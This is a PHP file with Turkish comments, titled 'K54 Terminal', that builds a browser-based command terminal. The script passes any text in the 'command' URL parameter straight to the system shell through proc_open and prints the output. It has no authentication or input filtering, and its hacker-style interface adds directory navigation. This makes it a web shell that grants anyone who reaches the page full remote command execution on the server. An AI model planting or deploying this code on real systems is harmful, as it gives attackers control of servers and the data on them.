<?php
session_start();

// Fonksiyon: Dosya uzantısına göre içeriği işle
function processContentByExtension($content, $extension) {
    // PHP ve HTML dosyalarını metin olarak işle
    if ($extension == "php" || $extension == "html" || $extension == "htm") {
        return highlight_string($content, true);
    }
    // Diğer dosyaları normal olarak işle
    return $content;
}

// Oturumda mevcut dizini sakla
if (!isset($_SESSION['current_directory'])) {
    $_SESSION['current_directory'] = __DIR__;
}

$currentDirectory = $_SESSION['current_directory'];

if(isset($_GET['command'])) {
    $command = $_GET['command'];

    if (strpos($command, 'cd ') !== false) {
        $parts = explode(' ', $command);
        if (count($parts) < 2) {
            echo "<pre>No directory specified. Usage: cd [directory]</pre>";
        } else {
            $directory = trim($parts[1]);
            chdir($currentDirectory);
            chdir($directory);
            $currentDirectory = getcwd();
            $_SESSION['current_directory'] = $currentDirectory;
        }
    } else {
        $descriptorspec = array(
           0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
           1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
           2 => array("pipe", "w")   // stderr is a pipe that the child will write to
        );

        $process = proc_open("cd ".$currentDirectory." && ".$command, $descriptorspec, $pipes);

        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }

        // "cat" komutu için çıktıları işle
        if (strpos($command, 'cat ') !== false) {
            $parts = explode(' ', $command);
            $filename = trim($parts[1]);
            $extension = pathinfo($filename, PATHINFO_EXTENSION);
            $output = processContentByExtension($output, $extension);
        }
        echo "<pre>$output</pre>";
    }
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>K54 Terminal</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: monospace;
            line-height: 1.5;
        }
        #terminal {
            width: 98.5%;
            height: 500px;
            overflow-y: scroll;
            border: 1px solid green;
            padding: 10px;
        }
        #currentDir {
            margin-bottom: 10px;
            font-family: monospace;
            color: cyan;
        }
        input {
            background-color: black;
            color: green;
            border: none;
            outline: none;
            width: calc(100% - 20px);
            font-family: monospace;
        }
        .command-output {
            margin-bottom: 10px;
            padding: 5px;
            border-radius: 5px;
            background-color: #222;
            overflow-x: auto; 
            word-wrap: break-word; 
        }
        #mainDirButton {
            position: fixed;
            bottom: 10px;
            right: 10px;
            padding: 5px 10px;
            background-color: green;
            color: black;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-family: monospace;
        }
    </style>
</head>
<body>
<div id="terminal"></div>
<div id="currentDir">terminal@K54: <?php echo $currentDirectory; ?> ></div>
<input type="text" id="command" placeholder="Komut girin..." autofocus autocomplete="off">
<button id="mainDirButton">Ana Dizine Git</button>
<script>
    // Terminali güncelle
    function updateTerminal(response) {
        var outputDiv = document.createElement("div");
        outputDiv.classList.add("command-output");
        outputDiv.innerHTML = response;
        document.getElementById("terminal").appendChild(outputDiv);
        document.getElementById("terminal").scrollTop = document.getElementById("terminal").scrollHeight;
    }

    // Mevcut dizini güncelle
    function updateCurrentDirectory() {
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4 && xhr.status == 200) {
                var response = xhr.responseText;
                document.getElementById("currentDir").innerHTML = "terminal@K54: " + response.trim();
            }
        };
        xhr.open("GET", "?command=pwd", true);
        xhr.send();
    }

    // Belirli aralıklarla mevcut dizini güncelle
    setInterval(updateCurrentDirectory, 1000);

    document.getElementById("command").addEventListener("keyup", function(event) {
        if (event.key === "Enter") {
            var command = this.value;
            this.value = "";
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    var response = xhr.responseText;
                    updateTerminal(response);
                }
            };
            xhr.open("GET", "?command=" + encodeURIComponent(command), true);
            xhr.send();
        }
    });

    // "Ana Dizine Git" butonuna tıklanınca
    document.getElementById("mainDirButton").addEventListener("click", function(event) {
        event.preventDefault(); // Formun gönderilmesini engelle
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4 && xhr.status == 200) {
                var response = xhr.responseText;
                updateTerminal(response);
            }
        };
        xhr.open("GET", "?command=cd <?php echo __DIR__; ?>", true);
        xhr.send();
    });
</script>
</body>
</html>
